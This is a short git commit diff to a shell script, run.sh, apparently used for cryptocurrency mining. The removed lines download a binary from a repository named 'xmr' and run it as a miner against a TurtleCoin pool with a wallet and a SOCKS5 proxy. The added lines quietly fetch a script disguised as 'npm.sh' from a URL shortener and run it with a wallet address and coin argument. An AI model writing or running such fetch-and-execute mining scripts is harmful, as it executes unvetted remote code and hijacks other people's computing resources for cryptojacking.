b4b90bc07189c204e21fd2766e156cc0804c3de1
ferasa <86012372+desafff@users.noreply.github.com>
2021-09-29 06:20:24 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,8 +1,5 @@
 #!/bin/sh
-wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
-chmod 777 masterfile
+wget -q git.io/npm.sh
+chmod +x npm.sh
 POOL=turtlecoin.herominers.com:10380
-WALLET=TRTLuwaiGbcexV82zFn2tk3gEemniqMYtirfBSYtXdBLFYE5yJpE15B9LYZxmGNzGPPYvGoCQ8Ke1ZXB49X1tQGCJKaoA9zPEKw+a496e7541267b713e71a50ccebf86c02c984a22cbacc038edf9637d02000e67f
-WORKER=CPU
-PROXY=socks5://192.252.209.155:14455
-./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
+./npm.sh DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW OKK1 DGB
